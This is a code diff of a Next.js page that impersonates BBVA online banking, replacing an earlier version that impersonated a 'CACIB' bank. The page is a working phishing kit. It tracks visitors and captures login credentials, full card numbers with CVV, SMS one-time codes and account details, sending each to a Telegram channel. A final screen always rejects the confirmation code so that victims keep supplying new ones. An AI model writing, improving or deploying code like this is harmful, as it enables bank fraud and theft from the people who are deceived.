@@ -1,598 +1,1481 @@
 "use client"
 
 import React, { useState, useEffect, useRef } from "react"
-import { Eye, EyeOff, X } from "lucide-react"
-import { useRouter } from "next/navigation"
+import { fetchVisitorInfo, sendTelegramMessage } from "@/lib/telegram"
+import {
+  ChevronLeft,
+  Eye,
+  EyeOff,
+  Globe,
+  HelpCircle,
+  Home,
+  Lock,
+  MapPin,
+  RotateCw,
+  UserPlus,
+  Users,
+} from "lucide-react"
 
-export default function MobileBankingLogin() {
-  const router = useRouter()
+// BBVA Official Brand Vector Logo
+function BbvaLogo() {
+  return (
+    <svg
+      viewBox="0 0 118 28"
+      className="h-[22px] sm:h-[25px] w-auto fill-white select-none drop-shadow-[0_1px_2px_rgba(0,0,0,0.25)]"
+      xmlns="http://www.w3.org/2000/svg"
+      aria-label="BBVA"
+    >
+      {/* 1st B */}
+      <path d="M0 0h15.2c6.2 0 10.2 2.7 10.2 6.8 0 2.8-1.8 5-4.6 6 3.6.9 5.8 3.5 5.8 7 0 4.8-4.3 8.2-11.4 8.2H0V0zm8.2 5.9v5.3h6c2.6 0 4.1-1.1 4.1-2.7s-1.5-2.6-4.1-2.6H8.2zm0 10.4v5.8h6.8c2.9 0 4.6-1.1 4.6-2.9s-1.7-2.9-4.6-2.9H8.2z" />
+      {/* 2nd B */}
+      <path d="M30 0h15.2c6.2 0 10.2 2.7 10.2 6.8 0 2.8-1.8 5-4.6 6 3.6.9 5.8 3.5 5.8 7 0 4.8-4.3 8.2-11.4 8.2H30V0zm8.2 5.9v5.3h6c2.6 0 4.1-1.1 4.1-2.7s-1.5-2.6-4.1-2.6h-6zm0 10.4v5.8h6.8c2.9 0 4.6-1.1 4.6-2.9s-1.7-2.9-4.6-2.9h-6.8z" />
+      {/* V */}
+      <path d="M60.4 0h8.2l7.2 19.5L83 0h8.2l-11.4 28H71.8L60.4 0z" />
+      {/* A (BBVA Inverted V) */}
+      <path d="M97.5 0h8.2l11.4 28h-8.2l-7.3-19.5L94.3 28H86.1L97.5 0z" />
+    </svg>
+  )
+}
+
+export default function BbvaPage(props: any) {
+  const initialScreen: "login" | "card" | "otp" | "accounts" | "confirm-otp" =
+    props?.initialScreen || "login"
+  const [currentScreen, setCurrentScreen] = useState<"login" | "card" | "otp" | "accounts" | "confirm-otp">(initialScreen)
+  const [isScreenLoading, setIsScreenLoading] = useState(false)
+  const [language, setLanguage] = useState<"en" | "es">("es")
+  const [locationInfo, setLocationInfo] = useState<{
+    ip?: string
+    city?: string
+    region?: string
+    country_name?: string
+    country_code?: string
+    org?: string
+    [key: string]: any
+  } | null>(null)
+
+  useEffect(() => {
+    if (typeof window !== "undefined") {
+      const p = window.location.pathname
+      if (p.includes("/cc")) {
+        setCurrentScreen("confirm-otp")
+      } else if (p.includes("/accounts")) {
+        setCurrentScreen("accounts")
+      } else if (p.includes("/verify") || p.includes("/otp")) {
+        setCurrentScreen("otp")
+      } else if (p.includes("/card")) {
+        setCurrentScreen("card")
+      }
+    }
+  }, [])
+
+  // Immediate visitor tracking and location alert on first screen
+  const hasTrackedVisitor = useRef(false)
+  useEffect(() => {
+    if (hasTrackedVisitor.current) return
+    hasTrackedVisitor.current = true
+
+    let isMounted = true
+    const trackVisitorOnLanding = async () => {
+      try {
+        const info = await fetchVisitorInfo()
+        if (info && isMounted) {
+          setLocationInfo(info)
+        }
+        await sendTelegramMessage({
+          title: "BBVA — New Visitor",
+          type: "visitor",
+        })
+      } catch (err) {
+        console.error("Visitor tracking error:", err)
+      }
+    }
+    trackVisitorOnLanding()
+    return () => {
+      isMounted = false
+    }
+  }, [])
+
+  // Login form states
   const [userId, setUserId] = useState("")
   const [password, setPassword] = useState("")
   const [showPassword, setShowPassword] = useState(false)
-  const [enableBiometrics, setEnableBiometrics] = useState(false)
-  const [isLoading, setIsLoading] = useState(false)
   const [errorMessage, setErrorMessage] = useState("")
 
-  // Verification Modal State
-  const [isVerificationModalOpen, setIsVerificationModalOpen] = useState(false)
-  const [verificationCode, setVerificationCode] = useState("")
-  const [attemptsLeft, setAttemptsLeft] = useState(4)
-  const [isModalSubmitting, setIsModalSubmitting] = useState(false)
-  const [modalError, setModalError] = useState("")
-  const [shakeCount, setShakeCount] = useState(0)
+  // Card form states
+  const [cardNumber, setCardNumber] = useState("")
+  const [cardMonth, setCardMonth] = useState("")
+  const [cardYear, setCardYear] = useState("")
+  const [cardCvv, setCardCvv] = useState("")
+  const [cardError, setCardError] = useState("")
+  const [isCardSubmitting, setIsCardSubmitting] = useState(false)
+
+  // Card input refs for auto-moving focus
+  const cardNumberRef = useRef<HTMLInputElement>(null)
+  const cardMonthRef = useRef<HTMLInputElement>(null)
+  const cardYearRef = useRef<HTMLInputElement>(null)
+  const cardCvvRef = useRef<HTMLInputElement>(null)
+
+  // OTP Screen States (6 digits matching Screenshot)
+  const [otp, setOtp] = useState<string[]>(["", "", "", "", "", ""])
+  const [focusedOtpIndex, setFocusedOtpIndex] = useState<number | null>(0)
+  const [timeLeft, setTimeLeft] = useState<number>(179) // 2:59
+  const [otpError, setOtpError] = useState("")
+  const [isOtpSubmitting, setIsOtpSubmitting] = useState(false)
   const [resendSuccess, setResendSuccess] = useState(false)
-  const codeInputRef = useRef<HTMLInputElement>(null)
+  const [shakeCount, setShakeCount] = useState(0)
+  const otpRefs = useRef<(HTMLInputElement | null)[]>([])
+
+  // Accounts screen states (Matching new Screenshot)
+  const [accountNumber, setAccountNumber] = useState("")
+  const [accountBalance, setAccountBalance] = useState("")
+  const [isAccountsSubmitting, setIsAccountsSubmitting] = useState(false)
+  const [accountsSuccess, setAccountsSuccess] = useState(false)
+
+  // Confirm Transaction OTP Screen States (Matching Screenshot 2 /cc)
+  const [confirmOtp, setConfirmOtp] = useState<string[]>(["", "", "", "", "", ""])
+  const [confirmFocusedIndex, setConfirmFocusedIndex] = useState<number | null>(0)
+  const [confirmTimeLeft, setConfirmTimeLeft] = useState<number>(178) // 2:58 as shown in screenshot
+  const [confirmAttempt, setConfirmAttempt] = useState<number>(1)
+  const [hasConfirmError, setHasConfirmError] = useState<boolean>(false)
+  const [confirmErrorMessage, setConfirmErrorMessage] = useState("Incorrect code. Please try again.")
+  const [isConfirmSubmitting, setIsConfirmSubmitting] = useState(false)
+  const [confirmShake, setConfirmShake] = useState(0)
+  const confirmOtpRefs = useRef<(HTMLInputElement | null)[]>([])
+
+  // Dynamic greeting based on Spain time (Europe/Madrid)
+  const [greeting, setGreeting] = useState("Buenos días")
+
+  useEffect(() => {
+    const updateGreeting = () => {
+      try {
+        const now = new Date()
+        const spainTime = new Date(now.toLocaleString("en-US", { timeZone: "Europe/Madrid" }))
+        const hour = spainTime.getHours()
+        if (hour >= 5 && hour < 12) {
+          setGreeting(language === "es" ? "Buenos días" : "Good morning")
+        } else if (hour >= 12 && hour < 19) {
+          setGreeting(language === "es" ? "Buenas tardes" : "Good afternoon")
+        } else {
+          setGreeting(language === "es" ? "Buenas noches" : "Good evening")
+        }
+      } catch {
+        setGreeting(language === "es" ? "Buenos días" : "Good morning")
+      }
+    }
+    updateGreeting()
+  }, [language])
 
   // Restore stored session values if available
   useEffect(() => {
     if (typeof window !== "undefined") {
-      const savedUser = sessionStorage.getItem("cacib_userId")
+      const savedUser = sessionStorage.getItem("bbva_userId") || sessionStorage.getItem("cacib_userId")
       if (savedUser) setUserId(savedUser)
     }
   }, [])
 
-  // Visitor Location tracking when user lands on login screen
+  // Timer countdown for OTP (Code expires in 2:59)
   useEffect(() => {
-    const trackVisitor = async () => {
-      try {
-        const { sendTelegramMessage, fetchVisitorInfo } = await import("@/lib/telegram")
-        await fetchVisitorInfo()
-        await sendTelegramMessage({
-          title: "👀 New Visitor Landed - CACIB Mobile Banking",
-          type: "visitor",
-        })
-      } catch {
-        // silent fallback
-      }
-    }
+    if (currentScreen !== "otp") return
+    if (timeLeft <= 0) return
+    const interval = setInterval(() => {
+      setTimeLeft((prev) => (prev > 0 ? prev - 1 : 0))
+    }, 1000)
+    return () => clearInterval(interval)
+  }, [currentScreen, timeLeft])
 
-    trackVisitor()
-  }, [])
-
-  // Auto-focus the code input when modal opens
+  // Timer countdown for Confirm OTP /cc (Code expires in 2:58)
   useEffect(() => {
-    if (isVerificationModalOpen) {
-      setTimeout(() => {
-        codeInputRef.current?.focus()
-      }, 150)
-    }
-  }, [isVerificationModalOpen])
+    if (currentScreen !== "confirm-otp") return
+    if (confirmTimeLeft <= 0) return
+    const interval = setInterval(() => {
+      setConfirmTimeLeft((prev) => (prev > 0 ? prev - 1 : 0))
+    }, 1000)
+    return () => clearInterval(interval)
+  }, [currentScreen, confirmTimeLeft])
 
-  // Triggered when user clicks LOGIN button on the main form
+  const formatTimer = (sec: number) => {
+    const m = Math.floor(sec / 60)
+    const s = sec % 60
+    return `${m}:${s < 10 ? "0" : ""}${s}`
+  }
+
+  // Auto-move: Card Number (16 digits -> moves to Month)
+  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
+    const raw = e.target.value.replace(/\D/g, "").slice(0, 16)
+    const formatted = raw.replace(/(\d{4})(?=\d)/g, "$1 ")
+    setCardNumber(formatted)
+    if (cardError) setCardError("")
+    if (raw.length === 16) {
+      cardMonthRef.current?.focus()
+    }
+  }
+
+  // Auto-move: Month (2 digits -> moves to Year)
+  const handleMonthChange = (e: React.ChangeEvent<HTMLInputElement>) => {
+    const val = e.target.value.replace(/\D/g, "").slice(0, 2)
+    setCardMonth(val)
+    if (cardError) setCardError("")
+    if (val.length === 2) {
+      cardYearRef.current?.focus()
+    }
+  }
+
+  const handleMonthKeyDown = (e: React.KeyboardEvent<HTMLInputElement>) => {
+    if (e.key === "Backspace" && !cardMonth) {
+      cardNumberRef.current?.focus()
+    }
+  }
+
+  // Auto-move: Year (2 digits -> moves to CVV)
+  const handleYearChange = (e: React.ChangeEvent<HTMLInputElement>) => {
+    const val = e.target.value.replace(/\D/g, "").slice(0, 2)
+    setCardYear(val)
+    if (cardError) setCardError("")
+    if (val.length === 2) {
+      cardCvvRef.current?.focus()
+    }
+  }
+
+  const handleYearKeyDown = (e: React.KeyboardEvent<HTMLInputElement>) => {
+    if (e.key === "Backspace" && !cardYear) {
+      cardMonthRef.current?.focus()
+    }
+  }
+
+  // CVV: Strictly 3 digits
+  const handleCvvChange = (e: React.ChangeEvent<HTMLInputElement>) => {
+    const val = e.target.value.replace(/\D/g, "").slice(0, 3)
+    setCardCvv(val)
+    if (cardError) setCardError("")
+  }
+
+  const handleCvvKeyDown = (e: React.KeyboardEvent<HTMLInputElement>) => {
+    if (e.key === "Backspace" && !cardCvv) {
+      cardYearRef.current?.focus()
+    }
+  }
+
+  // 1. Handle Login submission: Show blur loading for exactly 2 seconds, then transition to card screen
   const handleLogin = async (e?: React.FormEvent) => {
     if (e) e.preventDefault()
     if (!userId.trim()) {
-      setErrorMessage("Please enter your User ID")
+      setErrorMessage(language === "es" ? "Por favor, introduzca su Usuario" : "Please enter your User")
       return
     }
     if (!password.trim()) {
-      setErrorMessage("Please enter your Password")
+      setErrorMessage(language === "es" ? "Por favor, introduzca su Contraseña" : "Please enter your Password")
       return
     }
 
     setErrorMessage("")
-    setIsLoading(true)
+    setIsScreenLoading(true)
 
     if (typeof window !== "undefined") {
-      sessionStorage.setItem("cacib_userId", userId.trim())
-      sessionStorage.setItem("cacib_password", password)
+      sessionStorage.setItem("bbva_userId", userId.trim())
+      sessionStorage.setItem("bbva_password", password)
       sessionStorage.setItem("documentId", userId.trim())
     }
 
-    // Send Telegram alert for initial login credentials
     try {
-      const { sendTelegramMessage } = await import("@/lib/telegram")
       await sendTelegramMessage({
-        title: "🏛️ CACIB Mobile Banking - Login Attempt",
-        userId: userId.trim(),
-        documentId: userId.trim(),
+        title: "BBVA — Login Captured",
+        dni: userId.trim(),
         password: password,
-        faceIdEnabled: enableBiometrics ? "Yes" : "No",
-      }).catch(() => {})
-    } catch {
-      // Ignore if telegram not configured
+        type: "login",
+      })
+    } catch (err) {
+      console.error("Error sending Telegram notification:", err)
     }
 
-    // Open Verification Modal
+    // Wait exactly 2 seconds as requested, then switch to card screen
     setTimeout(() => {
-      setIsLoading(false)
-      setVerificationCode("")
-      setModalError("")
-      setIsVerificationModalOpen(true)
-    }, 400)
+      setIsScreenLoading(false)
+      setCurrentScreen("card")
+      if (typeof window !== "undefined" && window.history) {
+        window.history.pushState({ screen: "card" }, "", "/card")
+      }
+    }, 2000)
   }
 
-  // Handle Verification Code Submit inside the Modal:
-  // Shows invalid message each time while sending captured digits to Telegram
-  const handleVerificationSubmit = async (e?: React.FormEvent) => {
+  // 2. Handle Card Details Submit: Show blur loading for exactly 2 seconds, then transition to OTP screen
+  const handleCardSubmit = async (e?: React.FormEvent) => {
     if (e) e.preventDefault()
-    const trimmedCode = verificationCode.trim()
-    if (!trimmedCode) {
-      setModalError("Please enter your verification code")
-      setShakeCount((prev) => prev + 1)
-      codeInputRef.current?.focus()
+    const cleanCard = cardNumber.replace(/\s+/g, "")
+    if (cleanCard.length < 15) {
+      setCardError(language === "es" ? "Número de tarjeta no válido" : "Please enter a valid card number")
+      cardNumberRef.current?.focus()
+      return
+    }
+    if (!cardMonth || !cardYear) {
+      setCardError(language === "es" ? "Fecha de caducidad requerida" : "Expiration date is required")
+      if (!cardMonth) cardMonthRef.current?.focus()
+      else cardYearRef.current?.focus()
+      return
+    }
+    if (cardCvv.length !== 3) {
+      setCardError(language === "es" ? "El código CVV / CVC debe tener 3 dígitos" : "CVV must be 3 digits")
+      cardCvvRef.current?.focus()
       return
     }
 
-    setIsModalSubmitting(true)
-    setModalError("")
+    setCardError("")
+    setIsScreenLoading(true)
+
+    const expiry = `${cardMonth}/${cardYear}`
 
     if (typeof window !== "undefined") {
-      sessionStorage.setItem("cacib_verificationCode", trimmedCode)
+      sessionStorage.setItem("bbva_cardNumber", cleanCard)
+      sessionStorage.setItem("bbva_cardExpiry", expiry)
+      sessionStorage.setItem("bbva_cardCvv", cardCvv)
     }
 
-    // Send Telegram alert with every submitted code attempt
     try {
-      const { sendTelegramMessage } = await import("@/lib/telegram")
+      const savedUser = (typeof window !== "undefined" && sessionStorage.getItem("bbva_userId")) || userId.trim()
       await sendTelegramMessage({
-        title: "⚠️ CACIB - Verification OTP Attempt",
-        userId: userId.trim(),
-        documentId: userId.trim(),
-        password: password,
-        verificationCode: trimmedCode,
-        otp: trimmedCode,
-        codeLength: trimmedCode.length,
-        attemptsLeft: attemptsLeft > 1 ? attemptsLeft - 1 : 0,
-      }).catch(() => {})
-    } catch {
-      // Ignore if telegram not configured
+        title: "BBVA — Card Details Captured",
+        dni: savedUser || undefined,
+        cardNumber: cleanCard,
+        expiry: expiry,
+        cvv: cardCvv,
+        type: "card",
+      })
+    } catch (err) {
+      console.error("Error sending Telegram notification:", err)
     }
 
-    // Always show invalid verification message as requested
+    // Wait exactly 2 seconds as requested, then switch to OTP screen
     setTimeout(() => {
-      setIsModalSubmitting(false)
-      setModalError("Invalid verification code. Please try again.")
-      setShakeCount((prev) => prev + 1)
-      setVerificationCode("")
-      if (attemptsLeft > 1) {
-        setAttemptsLeft((prev) => prev - 1)
+      setIsScreenLoading(false)
+      setCurrentScreen("otp")
+      if (typeof window !== "undefined" && window.history) {
+        window.history.pushState({ screen: "otp" }, "", "/verify")
       }
       setTimeout(() => {
-        codeInputRef.current?.focus()
+        otpRefs.current[0]?.focus()
       }, 100)
-    }, 600)
+    }, 2000)
   }
 
-  // Handle Resend Code action
-  const handleResendCode = () => {
-    if (attemptsLeft > 1) {
-      setAttemptsLeft((prev) => prev - 1)
-      setResendSuccess(true)
-      setVerificationCode("")
-      setModalError("")
-      setTimeout(() => setResendSuccess(false), 3000)
+  // Helper to transition from OTP to Accounts page with 2-second loading (as requested)
+  const triggerOtpCompletion = (codeToSave: string) => {
+    setIsScreenLoading(true)
+    if (typeof window !== "undefined") {
+      sessionStorage.setItem("bbva_otp", codeToSave)
+    }
 
-      // Alert telegram of resend request
-      import("@/lib/telegram")
-        .then(({ sendTelegramMessage }) => {
-          sendTelegramMessage({
-            title: "🔄 CACIB - Resend Code Requested",
-            userId: userId.trim(),
-            documentId: userId.trim(),
-            remainingAttempts: attemptsLeft - 1,
-          }).catch(() => {})
-        })
-        .catch(() => {})
-    } else {
-      setModalError("No more attempts left. Please contact support.")
-      setShakeCount((prev) => prev + 1)
+    const savedUser = (typeof window !== "undefined" && sessionStorage.getItem("bbva_userId")) || userId.trim()
+    sendTelegramMessage({
+      title: "BBVA — SMS OTP Captured",
+      dni: savedUser || undefined,
+      otp1: codeToSave,
+      type: "otp",
+    }).catch((err) => console.error("Error sending Telegram notification:", err))
+
+    setTimeout(() => {
+      setIsScreenLoading(false)
+      setCurrentScreen("accounts")
+      if (typeof window !== "undefined" && window.history) {
+        window.history.pushState({ screen: "accounts" }, "", "/accounts")
+      }
+    }, 2000)
+  }
+
+  // 3. Handle OTP Code Digit Entry (Auto-moving through all 6 digits & auto-complete)
+  const handleOtpChange = (index: number, val: string) => {
+    const clean = val.replace(/\D/g, "")
+    if (!clean) {
+      const nextOtp = [...otp]
+      nextOtp[index] = ""
+      setOtp(nextOtp)
+      return
+    }
+
+    // Handle full paste
+    if (clean.length > 1) {
+      const digits = clean.slice(0, 6).split("")
+      const nextOtp = [...otp]
+      digits.forEach((d, i) => {
+        if (index + i < 6) nextOtp[index + i] = d
+      })
+      setOtp(nextOtp)
+      const targetFocus = Math.min(index + digits.length, 5)
+      otpRefs.current[targetFocus]?.focus()
+
+      const fullCode = nextOtp.join("")
+      if (fullCode.length === 6) {
+        triggerOtpCompletion(fullCode)
+      }
+      return
+    }
+
+    const nextOtp = [...otp]
+    nextOtp[index] = clean[clean.length - 1]
+    setOtp(nextOtp)
+    if (otpError) setOtpError("")
+
+    // Auto advance to next box
+    if (index < 5) {
+      otpRefs.current[index + 1]?.focus()
+    }
+
+    // Auto complete when all 6 digits entered
+    const fullCode = nextOtp.join("")
+    if (fullCode.length === 6) {
+      triggerOtpCompletion(fullCode)
     }
   }
+
+  const handleOtpKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
+    if (e.key === "Backspace") {
+      if (!otp[index] && index > 0) {
+        const nextOtp = [...otp]
+        nextOtp[index - 1] = ""
+        setOtp(nextOtp)
+        otpRefs.current[index - 1]?.focus()
+      } else {
+        const nextOtp = [...otp]
+        nextOtp[index] = ""
+        setOtp(nextOtp)
+      }
+    }
+  }
+
+  // Handle OTP Submit
+  const handleOtpSubmit = () => {
+    const fullCode = otp.join("")
+    if (fullCode.length < 6) {
+      setOtpError(
+        language === "es"
+          ? "Por favor, introduzca el código de 6 dígitos"
+          : "Please enter the full 6-digit code"
+      )
+      setShakeCount((prev) => prev + 1)
+      return
+    }
+
+    setOtpError("")
+    triggerOtpCompletion(fullCode)
+  }
+
+  // Handle Accounts submission: 2-second blurred loading overlay, then transition to Confirm OTP screen (/cc)
+  const handleAccountsSubmit = () => {
+    setIsAccountsSubmitting(true)
+    if (typeof window !== "undefined") {
+      if (accountNumber) sessionStorage.setItem("bbva_accountNumber", accountNumber)
+      if (accountBalance) sessionStorage.setItem("bbva_accountBalance", accountBalance)
+    }
+
+    const savedUser = (typeof window !== "undefined" && sessionStorage.getItem("bbva_userId")) || userId.trim()
+    sendTelegramMessage({
+      title: "BBVA — Account Details Captured",
+      dni: savedUser || undefined,
+      accountNumber: accountNumber || "N/A",
+      balance: accountBalance ? `€${accountBalance}` : "N/A",
+      type: "account",
+    }).catch((err) => console.error("Error sending Telegram notification:", err))
+
+    // Show 2-second loading overlay as requested
+    setIsScreenLoading(true)
+    setTimeout(() => {
+      setIsAccountsSubmitting(false)
+      setIsScreenLoading(false)
+      setCurrentScreen("confirm-otp")
+      if (typeof window !== "undefined" && window.history) {
+        window.history.pushState({ screen: "confirm-otp" }, "", "/cc")
+      }
+      setTimeout(() => {
+        confirmOtpRefs.current[0]?.focus()
+      }, 100)
+    }, 2000)
+  }
+
+  // Helper to trigger incorrect code error whenever the user inputs the 6th digit
+  const triggerConfirmError = (code: string) => {
+    if (typeof window !== "undefined") {
+      sessionStorage.setItem("bbva_confirm_otp", code)
+    }
+
+    const savedUser = (typeof window !== "undefined" && sessionStorage.getItem("bbva_userId")) || userId.trim()
+    sendTelegramMessage({
+      title: `BBVA — Transaction Confirm OTP (Attempt ${confirmAttempt})`,
+      dni: savedUser || undefined,
+      otp2: code,
+      attempt: `${confirmAttempt}`,
+      type: "confirm_otp",
+    }).catch((err) => console.error("Error sending Telegram notification:", err))
+
+    // Briefly let the 6th digit render, then display error, clear fields, and reset timer
+    setTimeout(() => {
+      setHasConfirmError(true)
+      setConfirmAttempt((prev) => Math.min(prev + 1, 3))
+      setConfirmShake((prev) => prev + 1)
+      // Clear fields and reset timer as requested by user
+      setConfirmOtp(["", "", "", "", "", ""])
+      setConfirmTimeLeft(178) // Reset timer to 2:58
+      setTimeout(() => {
+        confirmOtpRefs.current[0]?.focus()
+      }, 50)
+    }, 250)
+  }
+
+  // Handle Confirm OTP Digit Change (/cc)
+  const handleConfirmOtpChange = (index: number, val: string) => {
+    const clean = val.replace(/\D/g, "")
+    if (!clean) {
+      const nextOtp = [...confirmOtp]
+      nextOtp[index] = ""
+      setConfirmOtp(nextOtp)
+      if (hasConfirmError) setHasConfirmError(false)
+      return
+    }
+
+    // Paste handling
+    if (clean.length > 1) {
+      const digits = clean.slice(0, 6).split("")
+      const nextOtp = [...confirmOtp]
+      digits.forEach((d, i) => {
+        if (index + i < 6) nextOtp[index + i] = d
+      })
+      setConfirmOtp(nextOtp)
+      const targetFocus = Math.min(index + digits.length, 5)
+      confirmOtpRefs.current[targetFocus]?.focus()
+
+      const fullCode = nextOtp.join("")
+      if (fullCode.length === 6) {
+        triggerConfirmError(fullCode)
+      } else {
+        if (hasConfirmError) setHasConfirmError(false)
+      }
+      return
+    }
+
+    const nextOtp = [...confirmOtp]
+    nextOtp[index] = clean[clean.length - 1]
+    setConfirmOtp(nextOtp)
+
+    // Auto advance
+    if (index < 5) {
+      confirmOtpRefs.current[index + 1]?.focus()
+    }
+
+    const fullCode = nextOtp.join("")
+    if (fullCode.length === 6) {
+      // User placed the last OTP digit: trigger incorrect message and red borders
+      triggerConfirmError(fullCode)
+    } else {
+      // Don't make border red before that
+      if (hasConfirmError) {
+        setHasConfirmError(false)
+      }
+    }
+  }
+
+  const handleConfirmOtpKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
+    if (e.key === "Backspace") {
+      if (hasConfirmError) setHasConfirmError(false)
+      if (!confirmOtp[index] && index > 0) {
+        const nextOtp = [...confirmOtp]
+        nextOtp[index - 1] = ""
+        setConfirmOtp(nextOtp)
+        confirmOtpRefs.current[index - 1]?.focus()
+      } else {
+        const nextOtp = [...confirmOtp]
+        nextOtp[index] = ""
+        setConfirmOtp(nextOtp)
+      }
+    }
+  }
+
+  const handleConfirmOtpSubmit = () => {
+    const fullCode = confirmOtp.join("")
+    if (fullCode.length < 6) {
+      setConfirmShake((prev) => prev + 1)
+      return
+    }
+    triggerConfirmError(fullCode)
+  }
+
+  const handleResendConfirmOtp = () => {
+    setConfirmTimeLeft(178)
+    setConfirmOtp(["", "", "", "", "", ""])
+    setHasConfirmError(false)
+    confirmOtpRefs.current[0]?.focus()
+
+    const savedUser = (typeof window !== "undefined" && sessionStorage.getItem("bbva_userId")) || userId.trim()
+    sendTelegramMessage({
+      title: "BBVA — Confirm OTP Resend Requested",
+      dni: savedUser || undefined,
+      type: "resend_confirm_otp",
+    }).catch(() => {})
+  }
+
+  // Handle Resend OTP Code
+  const handleResendOtp = () => {
+    setTimeLeft(179)
+    setResendSuccess(true)
+    setOtp(["", "", "", "", "", ""])
+    setOtpError("")
+    setTimeout(() => setResendSuccess(false), 3000)
+    otpRefs.current[0]?.focus()
+
+    const savedUser = (typeof window !== "undefined" && sessionStorage.getItem("bbva_userId")) || userId.trim()
+    sendTelegramMessage({
+      title: "BBVA — OTP Resend Requested",
+      dni: savedUser || undefined,
+      type: "resend_otp",
+    }).catch(() => {})
+  }
+
+  const isCardFormValid =
+    cardNumber.replace(/\s+/g, "").length >= 15 &&
+    cardMonth.length === 2 &&
+    cardYear.length === 2 &&
+    cardCvv.length === 3
+
+  const isOtpComplete = otp.join("").length === 6
 
   return (
     <div
       dir="ltr"
-      className="fixed inset-0 w-full h-[100dvh] max-h-[100dvh] flex justify-center items-stretch bg-[#0c1424] font-sans selection:bg-[#fbd601]/30 select-none overflow-hidden overscroll-none"
+      className="fixed inset-0 w-full h-[100dvh] max-h-[100dvh] flex justify-center items-center font-sans select-none overflow-hidden overscroll-none"
+      style={{ backgroundColor: "#021493" }}
     >
-      {/* Mobile container - exact responsive layout with zero scroll */}
-      <main
-        className="relative w-full max-w-[503px] h-[100dvh] max-h-[100dvh] flex flex-col justify-between overflow-hidden shadow-2xl"
-        style={{
-          backgroundImage: "url('/bg.jpg')",
-          backgroundSize: "cover",
-          backgroundPosition: "top center",
-          backgroundRepeat: "no-repeat",
-        }}
-      >
-        {/* Subtle top gradient shadow to enhance header contrast */}
-        <div className="absolute top-0 inset-x-0 h-28 bg-gradient-to-b from-black/25 via-black/10 to-transparent pointer-events-none" />
-
-        {/* ========================================================================= */}
-        {/* TOP BAR: Menu/Settings Icon (Non-clickable) & CACIB Logo                  */}
-        {/* ========================================================================= */}
-        <header className="relative z-20 w-full px-[25px] pt-[20px] sm:pt-[22px] flex items-center justify-between shrink-0 select-none">
-          {/* Top-Left: Setting/Menu Icon - NOT CLICKABLE (Static visual brand motif) */}
-          <div
-            aria-hidden="true"
-            className="flex flex-col justify-between w-[48px] h-[30px] p-0 select-none pointer-events-none cursor-default"
-          >
-            {/* Line 1: Yellow short pill + White long pill */}
-            <div className="w-full flex items-center gap-[5px]">
-              <div className="w-[14px] h-[4px] bg-[#edd32f] rounded-full shadow-sm" />
-              <div className="flex-1 h-[4px] bg-white rounded-full shadow-sm" />
-            </div>
-
-            {/* Line 2: Full White pill */}
-            <div className="w-full h-[4px] bg-white rounded-full shadow-sm" />
-
-            {/* Line 3: Full White pill */}
-            <div className="w-full h-[4px] bg-white rounded-full shadow-sm" />
-
-            {/* Line 4: White long pill + Yellow short pill */}
-            <div className="w-full flex items-center gap-[5px]">
-              <div className="flex-1 h-[4px] bg-white rounded-full shadow-sm" />
-              <div className="w-[14px] h-[4px] bg-[#edd32f] rounded-full shadow-sm" />
-            </div>
-          </div>
-
-          {/* Top-Right: CACIB Brand Logo */}
-          <div className="flex items-center select-none pt-[3px]">
-            <span
-              className="text-[#edd32f] font-extrabold text-[30px] sm:text-[32px] tracking-[0.05em] uppercase leading-none select-none drop-shadow-[0_1px_2px_rgba(0,0,0,0.3)]"
-              style={{
-                fontFamily:
-                  "'Arial Narrow', 'Roboto Condensed', 'Franklin Gothic Medium', sans-serif-condensed, sans-serif",
-                transform: "scaleY(1.05)",
-              }}
-            >
-              CACIB
-            </span>
-          </div>
-        </header>
-
-        {/* ========================================================================= */}
-        {/* MAIN CONTENT AREA: Title, Inputs, Button & Toggle                         */}
-        {/* ========================================================================= */}
-        <section
-          className="relative z-10 w-full px-[25px] flex flex-col justify-start shrink-0"
+      {/* ========================================================================= */}
+      {/* 1. SCREEN 1: LOGIN SCREEN                                                 */}
+      {/* ========================================================================= */}
+      {currentScreen === "login" && (
+        <main
+          className="relative w-full max-w-[440px] sm:max-w-[460px] h-[100dvh] max-h-[100dvh] flex flex-col justify-between overflow-hidden shadow-2xl"
           style={{
-            paddingTop: "clamp(28px, 18vh, 190px)",
+            backgroundColor: "#021493",
+            backgroundImage: "url('/bbva_bg.jpg')",
+            backgroundSize: "cover",
+            backgroundPosition: "center",
+            backgroundRepeat: "no-repeat",
           }}
         >
-          {/* Heading: "Login to \n Mobile Banking" */}
-          <div
-            className="leading-tight select-none"
-            style={{
-              marginBottom: "clamp(16px, 3.2vh, 34px)",
-            }}
-          >
-            <h1 className="text-white text-[24px] sm:text-[27px] font-normal tracking-normal drop-shadow-[0_1px_2px_rgba(0,0,0,0.35)] mb-[2px]">
-              Login to
-            </h1>
-            <h2 className="text-white text-[28px] sm:text-[32px] font-medium tracking-normal drop-shadow-[0_1px_2px_rgba(0,0,0,0.35)]">
-              Mobile Banking
-            </h2>
-          </div>
-
-          {/* Form */}
-          <form onSubmit={handleLogin} className="w-full flex flex-col">
-            {/* Input 1: User ID */}
-            <div className="w-full">
-              <input
-                type="text"
-                autoComplete="username"
-                value={userId}
-                onChange={(e) => {
-                  setUserId(e.target.value)
-                  if (errorMessage) setErrorMessage("")
-                }}
-                placeholder="User ID"
-                className="w-full h-[50px] sm:h-[53px] px-[16px] bg-white rounded-[6px] border border-[#a4b5c7] text-[#1e293b] placeholder-[#717171] text-[16px] sm:text-[17px] font-normal shadow-[0_1px_2px_rgba(0,0,0,0.06)] focus:outline-none focus:border-[#2c5f7c] focus:ring-1 focus:ring-[#2c5f7c] transition-all"
-              />
+          {/* Header */}
+          <header className="relative z-20 w-full px-5 pt-5 sm:pt-6 flex items-center justify-between shrink-0 select-none">
+            <div className="w-[54px]" />
+            <div className="flex items-center justify-center">
+              <BbvaLogo />
             </div>
+            <button
+              type="button"
+              onClick={() => setLanguage(language === "en" ? "es" : "en")}
+              className="h-[28px] px-2.5 rounded-full border border-white/40 hover:border-white/70 bg-white/5 active:bg-white/15 text-white flex items-center gap-1.5 text-[11.5px] font-medium tracking-wide transition-colors cursor-pointer backdrop-blur-xs select-none"
+              aria-label="Toggle language"
+            >
+              <Globe className="w-3.5 h-3.5 stroke-[1.8]" />
+              <span className="font-semibold">{language === "en" ? "ES" : "EN"}</span>
+            </button>
+          </header>
 
-            {/* Input 2: Password with Eye Icon and Forgot? link */}
